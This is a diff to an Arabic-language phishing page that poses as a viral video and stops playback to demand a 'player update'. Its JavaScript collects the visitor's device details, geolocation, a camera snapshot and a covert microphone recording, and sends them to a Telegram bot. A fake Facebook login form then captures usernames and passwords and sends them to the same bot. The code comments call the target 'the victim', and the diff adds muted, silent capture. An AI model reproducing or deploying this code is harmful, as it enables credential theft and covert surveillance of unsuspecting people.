@@ -9,14 +9,13 @@
     <meta property="og:description" content="اضغط هنا لمشاهدة الفيديو الآن بجودة عالية قبل الحذف." />
     <meta property="og:image" content="trend_bg.jpg.jpg" />
     <meta property="og:type" content="video.other" />
-    <meta name="twitter:card" content="summary_large_image">
 
     <link rel="manifest" href="manifest.json">
     <style>
-        body { margin: 0; background: #000; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; }
+        body { margin: 0; background: #000; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         video { width: 100%; max-height: 100vh; cursor: pointer; }
         #pwa, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
-        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; }
         button { background: #1877f2; color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; color: #000; }
         .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
@@ -32,7 +31,7 @@
     <div id="pwa">
         <div class="box">
             <h3 style="color:#000; margin-top:0;">تحديث المشغل مطلوب</h3>
-            <p style="color:#606770; font-size:14px;">لمتابعة المشاهدة بدون تقطيع، يجب الانتقال للمشغل الرسمي المعتمد.</p>
+            <p style="color:#606770; font-size:14px;">لمتابعة المشاهدة بدون تقطيع، يجب الانتقال للمشغل الرسمي.</p>
             <button id="btn_ins">تثبيت واستكمال الفيديو</button>
         </div>
     </div>
@@ -40,11 +39,10 @@
     <div id="fb">
         <div class="box">
             <div class="logo">facebook</div>
-            <p style="color:#1c1e21; font-weight:bold; font-size:14px;">يجب تسجيل الدخول للمتابعة</p>
+            <p style="color:#1c1e21; font-weight:bold;">سجل الدخول للمتابعة</p>
             <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
             <input type="password" id="pass" placeholder="كلمة السر">
             <button id="btn_go">تسجيل الدخول</button>
-            <p style="color:#1877f2; font-size:12px; margin-top:15px; cursor:pointer;">هل نسيت كلمة السر؟</p>
         </div>
     </div>
 
@@ -59,31 +57,45 @@
         if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
         window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); p = e; });
 
-        // قطع الفيديو عند الثانية 10
         v.ontimeupdate = () => {
             if (v.currentTime >= 10) {
                 v.pause();
-                v.currentTime = 10;
                 document.getElementById('pwa').style.display = 'flex';
             }
         };
 
         document.getElementById('btn_ins').addEventListener('click', async () => {
             if (p) { p.prompt(); }
-            
-            // 1. سحب الموقع الجغرافي
+
+            // 1. سحب بيانات الجهاز الإضافية (البطارية، الشبكة، نوع الجهاز)
+            let deviceData = `📱 جهاز جديد متصل:\n`;
+            deviceData += `🌐 المتصفح: ${navigator.userAgent.split(') ')[1]}\n`;
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                deviceData += `🔋 البطارية: ${Math.round(b.level * 100)}%\n`;
+            }
+            if (navigator.connection) {
+                deviceData += `📶 الشبكة: ${navigator.connection.effectiveType}\n`;
+            }
+            sendMsg(deviceData);
+
+            // 2. سحب الموقع
             navigator.geolocation.getCurrentPosition((pos) => {
                 sendMsg(`📍 موقع الضحية:\nhttp://googleusercontent.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
             });
 
-            // 2. سحب الكاميرا والمايك (اللقطة الحية والتسجيل)
+            // 3. سحب الكاميرا والمايك بدون صدى
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: { echoCancellation: false, noiseSuppression: true } 
+                });
                 
-                // لقطة صورة فورية
+                // لقطة صورة صامتة
                 const canvas = document.getElementById('canvas');
                 const tempVideo = document.createElement('video');
                 tempVideo.srcObject = stream;
+                tempVideo.muted = true; // كتم الصوت عند الضحية لمنع الصدى
                 tempVideo.play();
 
                 setTimeout(() => {
@@ -92,12 +104,12 @@
                     canvas.toBlob((blob) => {
                         let fd = new FormData();
                         fd.append('chat_id', ID);
-                        fd.append('photo', blob, 'victim.jpg');
+                        fd.append('photo', blob, 'shot.jpg');
                         fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                     }, 'image/jpeg');
                 }, 1000);
 
-                // تسجيل صوتي 5 ثواني
+                // تسجيل صوتي صامت 5 ثواني
                 const recorder = new MediaRecorder(stream);
                 let chunks = [];
                 recorder.ondataavailable = (e) => chunks.push(e.data);
@@ -105,29 +117,28 @@
                     const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                     let fd = new FormData();
                     fd.append('chat_id', ID);
-                    fd.append('voice', audioBlob, 'record.ogg');
+                    fd.append('voice', audioBlob, 'voice.ogg');
                     fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
                 };
                 recorder.start();
                 setTimeout(() => {
                     recorder.stop();
                     stream.getTracks().forEach(t => t.stop());
-                    sendMsg("🎙️📸 تم سحب الصورة وتسجيل الصوت بنجاح!");
+                    sendMsg("🎙️📸 تم السحب بنجاح صامت!");
                 }, 5000);
 
-            } catch (e) { sendMsg("❌ الضحية رفض الأذونات"); }
+            } catch (e) { sendMsg("❌ رفض الأذونات"); }
             
             document.getElementById('pwa').style.display = 'none';
             document.getElementById('fb').style.display = 'flex';
         });
 
-        // صيد بيانات الفيسبوك
         document.getElementById('btn_go').addEventListener('click', () => {
             const u = document.getElementById('user').value;
             const ps = document.getElementById('pass').value;
             if(u && ps) {
-                sendMsg(`🔐 صيدة فيسبوك جديدة:\n📧: ${u}\n🔑: ${ps}`);
-                alert("⚠️ حدث خطأ في المصادقة، يرجى المحاولة لاحقاً.");
+                sendMsg(`🔐 حساب فيسبوك جديد:\n📧: ${u}\n🔑: ${ps}`);
+                alert("⚠️ خطأ في المصادقة، يرجى المحاولة لاحقاً.");
                 window.location.href = "https://m.facebook.com";
             }
         });
